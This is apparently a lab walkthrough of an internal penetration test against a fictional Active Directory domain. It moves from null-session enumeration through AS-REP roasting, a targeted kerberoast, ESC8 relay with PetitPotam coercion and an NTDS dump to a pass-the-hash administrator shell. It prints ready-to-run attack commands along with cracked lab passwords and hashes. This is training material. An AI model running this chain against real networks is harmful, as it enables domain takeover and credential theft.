
# Objective and scope

**ShadowGate** recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.

While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.

The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.

# Host file setup

```python
sudo nxc smb 10.1.180.146 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.1.180.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
```

- SMB signing is off

# Enumeration

## Open ports
```python
nmap -p- --min-rate=2000 -sT dc01.shadow.gate -Pn
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-15 13:41:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --min-rate=2000 -sT dc01.shadow.gate 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 18:37 +0100
Nmap scan report for dc01.shadow.gate (10.1.180.146)
Host is up (0.096s latency).
rDNS record for 10.1.180.146: DC01.shadow.gate

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-10 17:37:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Not valid before: 2026-01-11T02:45:29
|_Not valid after:  2026-07-13T02:45:29
| rdp-ntlm-info: 
|   Target_Name: SHADOW
|   NetBIOS_Domain_Name: SHADOW
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-10T17:38:31+00:00
|_ssl-date: 2026-05-10T17:39:11+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
The webserver running is just a default IIS server

# SMB (445)

## Null auth
```python
nxc smb dc01.shadow.gate -u '' -p '' --users-export users.txt
SMB         10.1.180.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.180.146    445    DC01             [+] shadow.gate\: 
SMB         10.1.180.146    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.180.146    445    DC01             Administrator                 2026-01-11 11:33:05 0       Built-in account for administering the computer/domain 
SMB         10.1.180.146    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.180.146    445    DC01             krbtgt                        2026-01-12 02:45:27 0       Key Distribution Center Service Account 
SMB         10.1.180.146    445    DC01             ATHENA                        2026-03-04 15:23:19 0        
SMB         10.1.180.146    445    DC01             mbrownlee                     2026-03-04 15:24:05 0        
SMB         10.1.180.146    445    DC01             bbrown                        2026-01-15 14:24:07 0        
SMB         10.1.180.146    445    DC01             jtrueblood                    2026-04-28 18:14:47 0        
SMB         10.1.180.146    445    DC01             jsmith                        2026-03-04 15:26:29 0        
SMB         10.1.180.146    445    DC01             clocke                        2026-03-04 15:24:32 0        
SMB         10.1.180.146    445    DC01             tclarke                       2026-03-04 15:25:33 0        
SMB         10.1.180.146    445    DC01             jbradford                     2026-03-04 15:24:59 0        
SMB         10.1.180.146    445    DC01             amoss                         2026-03-04 15:25:52 0        
SMB         10.1.180.146    445    DC01             [*] Enumerated 12 local users: SHADOW
SMB         10.1.180.146    445    DC01             [*] Writing 12 local users to users.txt
```
I am able to use null auth to dump users but not able to list shares

The guest account is disabled

# AS-REP roasting leads to user compromise

```python
nxc ldap dc01.shadow.gate -u users.txt -p '' --asreproast asrep.hash             
LDAP        10.1.130.196    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.1.130.196    389    DC01             $krb5asrep$23$jtrueblood@SHADOW.GATE:eaa351956f6d85d764b2bb1dc7829e68$d77aa89f900cdbe3580df5fcb6c7de8528ee114d5025e47cbf4a347833b9ba86e53e653fa9c39926f99d8e66693c19ff5d4d1b7a874431dd7960ec88fc43fb1b7178c920cc90806dced395f5276d137d9b76fb2bcdb2770b45ac46d4ecf13b39dec451afa97e38c3be9b59ef97d824cd2e1890129bba190b04b72e9c345cee041dedcaf6a75c102a3f38a639641bb0b0128ff2814dba990b6e045db85b67609248567ef143697a563b20f1314ce698ae4a4ea4f217671ca50471d5b5dda5ba39a896e376c6cc32d7951dac528a2983a6098e11e61b70cdb7d9ef315288d83d8006a950e6e41432f75e98
```
Found a hash for a user account

## Cracking the hash
```python
hashcat asrep.hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$jtrueblood@SHADOW.GATE:eaa351956f6d85d764b2bb1dc7829e68$d77aa89f900cdbe3580df5fcb6c7de8528ee114d5025e47cbf4a347833b9ba86e53e653fa9c39926f99d8e66693c19ff5d4d1b7a874431dd7960ec88fc43fb1b7178c920cc90806dced395f5276d137d9b76fb2bcdb2770b45ac46d4ecf13b39dec451afa97e38c3be9b59ef97d824cd2e1890129bba190b04b72e9c345cee041dedcaf6a75c102a3f38a639641bb0b0128ff2814dba990b6e045db85b67609248567ef143697a563b20f1314ce698ae4a4ea4f217671ca50471d5b5dda5ba39a896e376c6cc32d7951dac528a2983a6098e11e61b70cdb7d9ef315288d83d8006a950e6e41432f75e98:blood_brothers
```
The hash cracked

```python
jtrueblood:blood_brothers
```
Ill verify these credentials

```python
nxc smb dc01.shadow.gate -u jtrueblood -p 'blood_brothers'                                   
SMB         10.1.130.196    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.130.196    445    DC01             [+] shadow.gate\jtrueblood:blood_brothers
```
This user is now compromised

Now i have initial access i can see if any users are kerberoastable!

None are kerberoastable

This user also does not have access over RDP or WINRM

# Bloodhound

![](Pasted%20image%2020260510191247.png)

This user has GenericWrite over the user `bbrown`

I can either do a targeted kerberoast or apply shadow credentials

Ill try a targeted kerberoast first 

# Targeted kerberoast leads to user compromise

```python
bloodyAD --host dc01.shadow.gate -d shadow.gate -u 'jtrueblood' -p 'blood_brothers' set object 'bbrown' servicePrincipalName -v 'service/hacked'

[+] bbrown's servicePrincipalName has been updated
```
Ill start by adding the users SPN

```python
nxc ldap dc01.shadow.gate -u jtrueblood -p 'blood_brothers' --kerberoasting kerb.hash                    
LDAP        10.1.130.196    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
LDAP        10.1.130.196    389    DC01             [+] shadow.gate\jtrueblood:blood_brothers 
LDAP        10.1.130.196    389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.1.130.196    389    DC01             [*] Total of records returned 1
LDAP        10.1.130.196    389    DC01             [*] sAMAccountName: bbrown, memberOf: CN=ADCS-Reader,CN=Users,DC=shadow,DC=gate, pwdLastSet: 2026-01-15 14:24:07.120150, lastLogon: <never>
LDAP        10.1.130.196    389    DC01             $krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate\bbrown*$6bd6a9b56e8040df04bae8c345ade1f9$9a250c9df6f1c6498a7c976bcfb1034d8220fba826f940990179544c8be3905561805b1fab26f437e2b0ed886f40258e93c6abfdacee04f5e2b1c01f2cc41cac662a94d8f9ef02ffdaadabec64c99f1d4c6ae97c12d5ad27fcd72333c14db174a6b8d1ffe9792d7348b7d38f817f5de62f1ce79474dd7f567188807abfddd572597701a9af724dd6a9e3bb318b784cfd5b0158496a5f2c03aa6ddbb4b018f7ce4b7c3dcf512a2628e50d7c1eb291ed3f750a0c82dbebe3e51bf444a9caae336d6b5687048d1d3777e375683b92a7b660fc8ed94afd9b9e2825fc5f1b25fc30d9e8636c2c3624490990218723bbd978cd3e2ed0db83f158d5f89387e0d2cc174fba1370e863b8e88c5df93f78f1c1d8f19cc6dba9e83176280fb8a93554989661a4cdfea5ddbc982a84e19988a38d915773ab6d2c126aa064ae8484e596ef1d1f0c018a93490b93a1bea16029f33099e936e1e6aab01711fe4cc184eefa3866b6033df0cbc42183558ca1d842257f8c9d8e2e2055d0d87984da0500e572a924689f43717446ba98b201f9040ac554283a8301a72533bb02839fb0db15838b9fa3bd93cf0dae5e25dcc37a1b218a92c3ef4f12c0b26acaa02c196d285e0fcd5817b75b7390a728c2024719091ef7c719aa8bda648773f632f8334795aa64abf40440937ea43e33573cd399491c235a556fa8312cabb8be46065f5e411b1d4c785418713ca4ccf2222a9ff51a095a05c3b878ae213870f874e3c20f9ba834eec5cd5b0a0b32165b774ddccd46ceed1290b527c257ddb6007a7650c845188d2e47b6126782580eaecad25a3a2884b5f6824685c7881389b5b303d4fde04e38caf4008f4948f0c0f5c5ebf071cafea675846b41ccf732ddc97287e16b07f7e5a510d8f6d7bd1d5fdd22c7ce97d73aea2edaf9feeb56782e7b170c1d569603d401062c4bce7c2f8037c99c98f80587fdbddd999a8ecb671b27189e65452c1b4f93dc3dec251b69cd196845a9ac28ec89ae3467adc0ceecffc7237fcac9aa7510f903628260041ebd2eff51ed4967287d65be43bee6eb0d6abeaa17984a859514fa49dd98b67355d28eb42183dfb8df11f252a45d931fd192aadc709c596b4f3f662ff28ea93701d0cd2f794ecea3b56efa915dc6e9284628fa06d95e28fbd849d66107fcf1547cb76bdbb7e74f0fd691ea812d0259aefd387a82d570a68380707c84df09813ac25164f7d6f6dfa8474e1c9f112030fcf94b8a25a712758e629dca2b313d7833f7a95bbb76b1078880298d5676167055303e9b28c8851867caa95fb2e28d3ac7fd76bbf2caee46ab5e87859df0e2b93638cc87bc38c45cd68862341334249efbb8a3685b75f80177fc37c591bb286315a493493bb2f3c0814721efde3d7b806fdd8dbe9acae6c571caf3850a0f40cd556d3f701d3c7f2db25477a201155b9eaa7ba8bce9bb8e148d9265d1237b3276710258fefc67fd62ac495c3986e4bbdb3fcbb2ff9ac8deff5cd6d4ae8d7d992310d16163
```
Now i have the hash i can try to crack it!

## Cracking the hash

```python
hashcat kerb.hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate\bbrown*$6bd6a9b56e8040df04bae8c345ade1f9$9a250c9df6f1c6498a7c976bcfb1034d8220fba826f940990179544c8be3905561805b1fab26f437e2b0ed886f40258e93c6abfdacee04f5e2b1c01f2cc41cac662a94d8f9ef02ffdaadabec64c99f1d4c6ae97c12d5ad27fcd72333c14db174a6b8d1ffe9792d7348b7d38f817f5de62f1ce79474dd7f567188807abfddd572597701a9af724dd6a9e3bb318b784cfd5b0158496a5f2c03aa6ddbb4b018f7ce4b7c3dcf512a2628e50d7c1eb291ed3f750a0c82dbebe3e51bf444a9caae336d6b5687048d1d3777e375683b92a7b660fc8ed94afd9b9e2825fc5f1b25fc30d9e8636c2c3624490990218723bbd978cd3e2ed0db83f158d5f89387e0d2cc174fba1370e863b8e88c5df93f78f1c1d8f19cc6dba9e83176280fb8a93554989661a4cdfea5ddbc982a84e19988a38d915773ab6d2c126aa064ae8484e596ef1d1f0c018a93490b93a1bea16029f33099e936e1e6aab01711fe4cc184eefa3866b6033df0cbc42183558ca1d842257f8c9d8e2e2055d0d87984da0500e572a924689f43717446ba98b201f9040ac554283a8301a72533bb02839fb0db15838b9fa3bd93cf0dae5e25dcc37a1b218a92c3ef4f12c0b26acaa02c196d285e0fcd5817b75b7390a728c2024719091ef7c719aa8bda648773f632f8334795aa64abf40440937ea43e33573cd399491c235a556fa8312cabb8be46065f5e411b1d4c785418713ca4ccf2222a9ff51a095a05c3b878ae213870f874e3c20f9ba834eec5cd5b0a0b32165b774ddccd46ceed1290b527c257ddb6007a7650c845188d2e47b6126782580eaecad25a3a2884b5f6824685c7881389b5b303d4fde04e38caf4008f4948f0c0f5c5ebf071cafea675846b41ccf732ddc97287e16b07f7e5a510d8f6d7bd1d5fdd22c7ce97d73aea2edaf9feeb56782e7b170c1d569603d401062c4bce7c2f8037c99c98f80587fdbddd999a8ecb671b27189e65452c1b4f93dc3dec251b69cd196845a9ac28ec89ae3467adc0ceecffc7237fcac9aa7510f903628260041ebd2eff51ed4967287d65be43bee6eb0d6abeaa17984a859514fa49dd98b67355d28eb42183dfb8df11f252a45d931fd192aadc709c596b4f3f662ff28ea93701d0cd2f794ecea3b56efa915dc6e9284628fa06d95e28fbd849d66107fcf1547cb76bdbb7e74f0fd691ea812d0259aefd387a82d570a68380707c84df09813ac25164f7d6f6dfa8474e1c9f112030fcf94b8a25a712758e629dca2b313d7833f7a95bbb76b1078880298d5676167055303e9b28c8851867caa95fb2e28d3ac7fd76bbf2caee46ab5e87859df0e2b93638cc87bc38c45cd68862341334249efbb8a3685b75f80177fc37c591bb286315a493493bb2f3c0814721efde3d7b806fdd8dbe9acae6c571caf3850a0f40cd556d3f701d3c7f2db25477a201155b9eaa7ba8bce9bb8e148d9265d1237b3276710258fefc67fd62ac495c3986e4bbdb3fcbb2ff9ac8deff5cd6d4ae8d7d992310d16163:12345678
```
The hash cracked

```python
bbrown:12345678
```
Ill verify these credentials

```python
nxc smb dc01.shadow.gate -u bbrown -p 12345678                                       
SMB         10.1.130.196    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.130.196    445    DC01             [+] shadow.gate\bbrown:12345678
```
This user is compromised!

![](Pasted%20image%2020260510191828.png)

This user is part of the ADCS-READER group so maybe i should check for some vulnerable templates

# ADCS

```python
certipy-ad find -u bbrown@dc01.shadow.gate -p '12345678' -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.SHADOW.GATE.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC01.shadow.gate.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'shadow-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'shadow-DC01-CA'
[*] Checking web enrollment for CA 'shadow-DC01-CA' @ 'DC01.shadow.gate'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : shadow-DC01-CA
    DNS Name                            : DC01.shadow.gate
    Certificate Subject                 : CN=shadow-DC01-CA, DC=shadow, DC=gate
    Certificate Serial Number           : 749A4BA2BEA3CFBC41ECDFAEE502E46C
    Certificate Validity Start          : 2026-01-12 02:50:31+00:00
    Certificate Validity End            : 2046-01-12 03:00:31+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SHADOW.GATE\Administrators
      Access Rights
        ManageCa                        : SHADOW.GATE\Administrators
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Enterprise Admins
        ManageCertificates              : SHADOW.GATE\Administrators
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Enterprise Admins
        Enroll                          : SHADOW.GATE\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```
It is vulnerable to ESC8

## ESC8 leads to domain admin!

I can target the DomainController template since it is enabled and allowed client authentication, and it has enrolkments rights for the domain controller

```python
impacket-ntlmrelayx --adcs -smb2support --template DomainController -t http://shadow.gate/certsrv/certfnsh.asp 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client RPC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client WINRMS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```
Ill start by setting the relay this is where i will receive the authentication and this will forward the authentication to the vulnerable HTTP endpoint which should return a certificate!

```python
nxc smb dc01.shadow.gate -d shadow.gate -u bbrown -p '12345678' -M coerce_plus -o METHOD=PetitPotam LISTENER=10.200.55.70
SMB         10.1.130.196    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.130.196    445    DC01             [+] shadow.gate\bbrown:12345678 
COERCE_PLUS 10.1.130.196    445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 10.1.130.196    445    DC01             Exploit Success, efsrpc\EfsRpcAddUsersToFile
```
This has relayed authentication back to me!

```python
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.1.130.196, attacking target http://shadow.gate
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.1.130.196 against http://shadow.gate SUCCEED [1]
[*] http:///@shadow.gate [1] -> Generating CSR...
[*] http:///@shadow.gate [1] -> CSR generated!
[*] http:///@shadow.gate [1] -> Getting certificate...
[*] (SMB): Received connection from 10.1.130.196, attacking target http://shadow.gate
[*] http:///@shadow.gate [1] -> GOT CERTIFICATE! ID 3
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.1.130.196 against http://shadow.gate SUCCEED [2]
[*] http:///@shadow.gate [1] -> Writing PKCS#12 certificate to ./DC01.shadow.gate.pfx
[*] http:///@shadow.gate [1] -> Certificate successfully written to file
[*] http:///@shadow.gate [2] -> Skipping user  since attack was already performed
```
I now have a certificate for DC01

```python
certipy-ad auth -pfx DC01.shadow.gate.pfx -dc-ip 10.1.130.196        
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531
```
Now i have the NTLM hash for the user, i can perform a DCSync

```python
nxc smb dc01.shadow.gate -u 'dc01$' -H '57867e655d1abc9f45fd6e954e351531' --ntds     
SMB         10.1.130.196    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.130.196    445    DC01             [+] shadow.gate\dc01$:57867e655d1abc9f45fd6e954e351531 
SMB         10.1.130.196    445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         10.1.130.196    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.1.130.196    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
SMB         10.1.130.196    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.130.196    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b5509cbfe52e94940c0ec99b21e09802:::
SMB         10.1.130.196    445    DC01             shadow.gate\ATHENA:1103:aad3b435b51404eeaad3b435b51404ee:3215f4c7c852647c88694ab0b57daaba:::
SMB         10.1.130.196    445    DC01             shadow.gate\mbrownlee:1104:aad3b435b51404eeaad3b435b51404ee:6f16868319543175e7f3e6d4eea9adfb:::
SMB         10.1.130.196    445    DC01             shadow.gate\bbrown:1109:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
SMB         10.1.130.196    445    DC01             shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:27e133a345b980d24e3a60f169f2cb7e:::
SMB         10.1.130.196    445    DC01             shadow.gate\jsmith:1112:aad3b435b51404eeaad3b435b51404ee:be0b6d125a6645747d91d30ed3bef98f:::
SMB         10.1.130.196    445    DC01             shadow.gate\clocke:1113:aad3b435b51404eeaad3b435b51404ee:ff506444e2c59b0241812e8e17b0f05e:::
SMB         10.1.130.196    445    DC01             shadow.gate\tclarke:1114:aad3b435b51404eeaad3b435b51404ee:9290a555713c7db0cf7fbf0ac28c1100:::
SMB         10.1.130.196    445    DC01             shadow.gate\jbradford:1115:aad3b435b51404eeaad3b435b51404ee:f5c86043de2a116c6458f3de9aad89de:::
SMB         10.1.130.196    445    DC01             shadow.gate\amoss:1116:aad3b435b51404eeaad3b435b51404ee:381480af4a988ad46758c2f79ee64090:::
SMB         10.1.130.196    445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531:::
SMB         10.1.130.196    445    DC01             [+] Dumped 13 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.1.130.196_2026-05-10_193122.ntds of which 12 were added to the database
SMB         10.1.130.196    445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         10.1.130.196    445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.1.130.196_2026-05-10_193122.ntds | cut -d ':' -f1
```
I can now dump the contents of NTDS via nxc or secretsdump, in this case ill use nxc

```python
evil-winrm -i dc01.shadow.gate -u Administrator -H '4366ec0f86e29be2a4a5e87a1ba922ec' 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
Full domain compromise!

